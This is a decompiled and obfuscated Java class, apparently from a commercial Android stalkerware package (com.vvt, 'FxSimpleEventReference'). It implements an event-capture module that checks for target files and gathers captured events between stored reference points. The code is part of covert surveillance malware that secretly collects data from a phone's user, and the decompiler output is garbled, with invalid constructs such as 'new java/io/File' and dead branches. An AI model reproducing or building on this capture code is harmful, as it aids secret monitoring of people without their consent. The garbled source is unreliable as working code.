package com.vvt.capture.c.a.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.b;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class c
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  private String e;
  private b f;
  
  public c(String paramString, b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  private boolean b()
  {
    boolean bool1 = false;
    String[] arrayOfString = com.vvt.capture.c.c.b();
    int i = arrayOfString.length;
    int j = 0;
    for (;;)
    {
      if (j < i)
      {
        String str = arrayOfString[j];
        File localFile = new java/io/File;
        localFile.<init>(str);
        boolean bool2 = localFile.exists();
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      j += 1;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    long l2 = 3000L;
    SystemClock.sleep(l2);
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = b();
      if (bool1)
      {
        long l3 = com.vvt.capture.c.c.c();
        bool1 = false;
        Object localObject = null;
        l2 = l3;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l2 < l1;
          if (bool3) {
            break;
          }
          int k = 5;
          if (j >= k) {
            break;
          }
          l2 = 2000L;
          SystemClock.sleep(l2);
          long l4 = com.vvt.capture.c.c.c();
          int i = j + 1;
          j = i;
          l2 = l4;
        }
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l2 = l1;
      bool4 = l2 < l1;
      if (bool4) {
        break label171;
      }
    }
    if (bool2) {}
    l2 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l2);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label171:
      this.d = l2;
    }
  }
  
  public List a(int paramInt)
  {
    bool = a;
    if (bool) {}
    long l1 = 3000L;
    SystemClock.sleep(l1);
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        bool = b();
        if (bool)
        {
          l2 = com.vvt.capture.c.c.c();
          l1 = com.vvt.capture.c.c.a(paramInt);
          long l3 = 1L;
          l4 = l1 - l3;
        }
      }
      catch (Exception localException2)
      {
        long l2;
        long l4;
        Object localObject;
        b localb;
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
      }
      try
      {
        localObject = this.e;
        localb = this.f;
        localObject = com.vvt.capture.c.c.a((String)localObject, l4, l2, localb);
        localArrayList.addAll((Collection)localObject);
      }
      catch (Exception localException1)
      {
        bool = c;
        if (!bool) {
          continue;
        }
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.e;
      b localb = this.f;
      localObject = com.vvt.capture.c.c.a((String)localObject, l1, l2, localb);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/a/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */